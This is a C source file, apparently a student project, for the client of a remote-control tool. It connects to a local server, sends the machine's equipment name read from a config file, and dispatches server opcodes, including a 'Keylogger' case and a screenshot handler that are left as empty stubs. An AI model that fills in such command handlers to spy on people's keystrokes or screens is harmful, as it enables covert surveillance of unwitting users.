#include <stdio.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>
#include "clientManager.h"
#include "constraints.h"
#include "messageManager.h"
#include "utils.h"

extern clientInfo_t clientData;

void connectionInitialize(int* sock)
{
    struct sockaddr_in server;

    // Create socket
    *sock = socket(AF_INET, SOCK_STREAM, 0);
    if (*sock == -1) {
        printf("Could not create socket\n");
        exit(1);
    }
    printf("Socket created\n");

    server.sin_addr.s_addr = inet_addr("127.0.0.1");  // Server IP
    server.sin_family = AF_INET;
    server.sin_port = htons(8888);  // Server port

    // Connect to remote server
    if (connect(*sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Connect failed. Error");
        exit(1);
    }
    printf("Connected\n");
}

void startingDataInitialize()
{
    //Trimite Date despre Utilizator--------------------
    int fd = open(CLIENT_CONFIG_FILE, O_RDONLY);
    if (fd < 0)
    {
        printf("Error Opening Config file.\n");
        exit(-1);
    }

    char buffer[BUFFER_SIZE];

    ssize_t bytes_read = read(fd, buffer, sizeof(buffer) - 1);
    if (bytes_read < 0) {
        perror("Eroare la citirea fișierului");
        close(fd);
        exit(-1);
    }
    close(fd);

    buffer[bytes_read] = '\0';
    char sendBuffer[BUFFER_SIZE]="";
    char*p = strtok(buffer, " =\n");
    while(p)
    {
        if(strcmp(p, "Nume_Echipament") == 0)
        {
            p = strtok(NULL, "= \n");
            strcat(sendBuffer, p);
        }
        p = strtok(NULL, "= \n");
    }

    message_t msg;
    encapsulateMessage(&msg, sendBuffer, 'U');

    sendMessage(clientData.serverSocket, &msg);
}

void handleScreenshotOpcode()
{
    pid_t pid = fork();
    message_t msg;
    if(pid == 0)
    {
        
    }
    else if(pid > 0)
    {
        wait(NULL);
    }
    else
    {
        msg.opCode = 'E';
        strcpy(msg.buffer, "Failed to fork for Screenshot.\n");
        msg.size = strlen(msg.buffer);
        sendMessage(clientData.serverSocket, &msg);
    }
}

void handleOpcode(int sock, message_t msg)
{
    switch(msg.opCode)
    {
        case 'K':
        //handle Keylogger Opcode
        break;
        case 'S':
        handleScreenshotOpcode(sock);
        break;
    }
}